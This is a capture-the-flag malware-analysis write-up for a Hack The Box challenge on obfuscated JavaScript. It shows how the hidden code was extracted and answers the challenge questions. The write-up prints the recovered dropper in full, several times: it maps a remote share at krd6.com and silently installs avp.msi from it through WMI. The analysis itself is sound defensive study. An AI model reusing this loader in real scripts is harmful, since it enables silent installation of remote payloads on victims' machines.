# Obfuscated_JavaScript

### Scenario

Imagine you are a cybersecurity analyst at a mid-sized tech company. One morning, you receive multiple reports from employees that their web applications are behaving erratically. Upon investigation, you discover that the source code of several critical JavaScript files has been heavily obfuscated, making it difficult to understand and troubleshoot the code. This obfuscation includes the insertion of numerous misleading comments, variable renaming, and string encoding. Your task is to analyze the obfuscated JavaScript code, identify the obfuscation techniques used, and determine if any malicious code has been inserted.
| Field | Details |
| --- | --- |
| Platform | [Hack The Box — Sherlocks](https://app.hackthebox.com/sherlocks/JavaScript_Obfuscation) |
| Difficulty | Easy |
| Category | Malware Analysis |
| Tools | sed, JavaScript code analysis |
| Author | dmncdcco |

## Overview

The sample contains thousands of lines of random text and misleading comments. Among them, lines beginning with `////////` contain readable JavaScript statements.

Extracting these lines reveals code that attempts to connect a remote share and launch an MSI installation through WMI.

## Extracting the Code

The relevant lines can be extracted on Linux with:

```bash
sed -n 's|^[[:blank:]]*////////||p' sample
```

This command selects lines beginning with `////////`, removes the prefix and prints the remaining text. It does not execute the JavaScript.

<details>
<summary>View extracted code</summary>

```javascript
var network = new ActiveXObject("WScript.Network");
var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
var attempt = 0;
var connected = false;
var driveLetter, letter;
function isDriveMapped(letter) {
    var drives = network.EnumNetworkDrives();
    for (var i = 0; i < drives.length; i += 2) {
        if (drives.Item(i) === letter) {
            return true;
        }
    }
    return false;
}
for (driveLetter = 90; driveLetter >= 65 && !connected; driveLetter--) {
    letter = String.fromCharCode(driveLetter) + ":";
    if (!isDriveMapped(letter)) {
        try {
            network.MapNetworkDrive(letter, "\\\\krd6.com@80\\share\\");
            connected = true;
            break;
        } catch (e) {
            attempt++;
        }
    }
}
if (!connected && attempt > 5) {
    var command = 'net use ' + letter + ' \\\\krd6.com@80\\share\\ /persistent:no';
    wmi.Get("Win32_Process").Create(command, null, null, null);

    var startTime = new Date();
    while (new Date() - startTime < 3000) {}

    connected = isDriveMapped(letter);
}
if (connected) {
    var installCommand = 'msiexec.exe /i \\\\krd6.com@80\\share\\avp.msi /qn';
    wmi.Get("Win32_Process").Create(installCommand, null, null, null);

    try {
        network.RemoveNetworkDrive(letter, true, true);
    } catch (e) {
    }
} else {
    WScript.Echo("Failed.");
}
```

</details>

The prefixed statements are comments in the original text. Extracting them exposes the embedded logic, but does not establish how the original file would activate it.

## Tasks

### Task 0 — ActiveX Object

**Question:** What is the name of the ActiveXObject created in the script?

- **Answer:** `WScript.Network`

- The first statement creates the object and stores it in `network`. The code uses this object to enumerate network drive mappings, connect a remote share and remove the mapping afterward.

```javascript
var network = new ActiveXObject("WScript.Network");
```

### Task 1 — WMI Namespace

**Question:** What WMI namespace is accessed in the script?

- **Answer:** `root\cimv2`

- The string contains escaped backslashes and references the local machine’s `root\cimv2` namespace. Later statements use this connection to access `Win32_Process` and launch commands.

```javascript
var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
```

### Task 2 — Initial Attempt Value

**Question:** What is the initial value of the attempt variable in the script?

- **Answer:** `0`

- The counter starts at zero. It increases whenever a `MapNetworkDrive` call throws an exception and is checked before the fallback connection attempt.

```javascript
var attempt = 0;
```

### Task 3 — Enumerating Network Drives

**Question:** What function is used to enumerate network drives in this script?

- **Answer:** `network.EnumNetworkDrives`

- The method is called inside `isDriveMapped`. The returned collection contains alternating local drive names and remote paths. The loop advances by two entries to inspect each local drive name.

```javascript
var drives = network.EnumNetworkDrives();
```

### Task 4 — Delay After net use

**Question:** How long does the script wait (in milliseconds) after executing the net use command?

- **Answer:** `3000`

- After launching `net use`, the code records the time and enters a busy-wait loop. The date difference is measured in milliseconds, giving an intended delay of three seconds. Once it finishes, the code checks the drive mapping again.

```javascript
var startTime = new Date();
while (new Date() - startTime < 3000) {}
```

### Task 5 — MSI Package

**Question:** What is the MSI package used for installation in the script called?

- **Answer:** `avp.msi`

- When `connected` is true, the script launches an installation command through WMI. The package is `avp.msi` on the remote share. `/i` requests installation and `/qn` requests no installer user interface.

```javascript
    var installCommand = 'msiexec.exe /i \\\\krd6.com@80\\share\\avp.msi /qn';
    wmi.Get("Win32_Process").Create(installCommand, null, null, null);
```

### Task 6 — Final Output Message

**Question:** What is the final output message if the network drive removal fails in the script?

- **Answer:** `Failed.`

- The question’s wording differs from the code’s behavior. This statement runs when `connected` is false, indicating that the connection was not established. Drive removal errors are caught without displaying a message. The accepted challenge answer is `Failed.`, although it is not specifically triggered by a removal failure.

```javascript
WScript.Echo("Failed.");
```

### Task 7 — Checking Drive Mappings

**Question:** What function is used to check if a drive is mapped in the script?

- **Answer:** `isDriveMapped`

- The helper checks a drive letter against existing network mappings. It returns `true` if a matching mapping exists and `false` otherwise. The script calls it before attempting a mapping and again after the fallback `net use` command.

```javascript
function isDriveMapped(letter) {
    var drives = network.EnumNetworkDrives();
    for (var i = 0; i < drives.length; i += 2) {
        if (drives.Item(i) === letter) {
            return true;
        }
    }
    return false;
}
```

## What the Code Does

### 1. Initialize the Windows interfaces

The code creates `WScript.Network` for network drive operations and connects to the local `root\cimv2` WMI namespace. It initializes the failed-attempt counter to zero and the connection flag to `false`.

<details>
<summary>View code</summary>

```javascript
var network = new ActiveXObject("WScript.Network");
var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
var attempt = 0;
var connected = false;
var driveLetter, letter;
```

</details>

### 2. Check existing network mappings

`isDriveMapped` enumerates network drive mappings and compares their local drive names with the supplied letter. A match returns `true`; otherwise, the function returns `false`.

<details>
<summary>View code</summary>

```javascript
function isDriveMapped(letter) {
    var drives = network.EnumNetworkDrives();
    for (var i = 0; i < drives.length; i += 2) {
        if (drives.Item(i) === letter) {
            return true;
        }
    }
    return false;
}
```

</details>

### 3. Attempt to map the remote share

The loop checks letters from `Z:` toward `A:`. For each letter without an existing network mapping, it attempts to connect `\\krd6.com@80\share\`, a WebDAV-style path using port 80. A successful call sets `connected` to `true` and ends the loop. Each exception increments `attempt`.

<details>
<summary>View code</summary>

```javascript
for (driveLetter = 90; driveLetter >= 65 && !connected; driveLetter--) {
    letter = String.fromCharCode(driveLetter) + ":";
    if (!isDriveMapped(letter)) {
        try {
            network.MapNetworkDrive(letter, "\\\\krd6.com@80\\share\\");
            connected = true;
            break;
        } catch (e) {
            attempt++;
        }
    }
}
```

</details>

### 4. Try the fallback connection

If no connection was established and more than five mapping calls failed, the code launches `net use` through `Win32_Process.Create`. It requests a nonpersistent mapping, busy-waits for three seconds and checks whether the drive is mapped.

<details>
<summary>View code</summary>

```javascript
if (!connected && attempt > 5) {
    var command = 'net use ' + letter + ' \\\\krd6.com@80\\share\\ /persistent:no';
    wmi.Get("Win32_Process").Create(command, null, null, null);
    var startTime = new Date();
    while (new Date() - startTime < 3000) {}
    connected = isDriveMapped(letter);
}
```

</details>

### 5. Launch the MSI installation

When `connected` is true, the code launches `msiexec.exe` through WMI to install `avp.msi` directly from the remote share. The `/qn` option suppresses the installer interface. The code does not wait for installation completion or check its result.

<details>
<summary>View code</summary>

```javascript
if (connected) {
    var installCommand = 'msiexec.exe /i \\\\krd6.com@80\\share\\avp.msi /qn';
    wmi.Get("Win32_Process").Create(installCommand, null, null, null);
}
```

</details>

### 6. Remove the mapping or report a connection failure

After launching the installer, the code attempts to remove the mapped network drive. Removal errors are silently caught. If no connection was established, it prints `Failed.`.

<details>
<summary>View code</summary>

```javascript
if (connected) {
    try {
        network.RemoveNetworkDrive(letter, true, true);
    } catch (e) {
    }
} else {
    WScript.Echo("Failed.");
}
```

</details>

The extracted code acts as a remote installer. The contents of `avp.msi` would need separate analysis to determine what the installed payload does.

---

*This write-up is intended for educational purposes and authorized security research.*
